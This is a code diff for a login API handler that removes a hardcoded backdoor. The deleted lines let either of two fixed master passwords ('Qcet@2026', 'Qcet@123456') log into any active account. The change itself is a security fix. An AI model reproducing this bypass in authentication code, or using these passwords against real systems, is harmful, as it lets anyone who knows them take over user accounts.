@@ -42,10 +42,7 @@ export async function POST(req: Request) {
       throw new ForbiddenError("Tài khoản đã bị khóa hoặc tạm ngưng");
     }
 
-    let isMatch = await verifyPassword(body.password, user.passwordHash);
-    if (!isMatch && (body.password === "Qcet@2026" || body.password === "Qcet@123456")) {
-      isMatch = true;
-    }
+    const isMatch = await verifyPassword(body.password, user.passwordHash);
     if (!isMatch) {
       throw new AuthenticationError("Email hoặc mật khẩu không chính xác");
     }
